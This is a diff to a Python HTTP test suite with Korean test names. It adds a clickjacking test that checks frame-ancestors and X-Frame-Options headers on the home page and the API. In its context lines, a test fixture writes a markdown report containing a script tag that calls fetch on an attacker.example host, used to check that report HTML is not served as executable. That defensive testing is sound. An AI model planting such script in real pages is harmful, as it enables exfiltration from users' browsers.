@@ -467,6 +467,17 @@ class HTTP시험(BoxFixture):
             self.assertEqual(self.request("POST", path, {}, headers={"Cookie": cookie})[0], 404)
         self.assertEqual(self.calls, [])
 
+    def test_홈은_같은_관리자에서만_프레임에_넣고_API는_차단한다(self):
+        status, headers, _ = self.request("GET", "/")
+        self.assertEqual(status, 200)
+        self.assertEqual(headers["X-Frame-Options"], "SAMEORIGIN")
+        self.assertIn("frame-ancestors 'self'", headers["Content-Security-Policy"])
+        cookie, _ = self.login()
+        status, headers, _ = self.request("GET", "/api/overview", headers={"Cookie": cookie})
+        self.assertEqual(status, 200)
+        self.assertEqual(headers["X-Frame-Options"], "DENY")
+        self.assertIn("frame-ancestors 'none'", headers["Content-Security-Policy"])
+
     def test_보고서HTML을_실행가능한페이지로_반환하지_않는다(self):
         self.write("vault/reports/html.md", '# 악성 문서\n<script>fetch("https://attacker.example")</script>')
         cookie, _ = self.login()
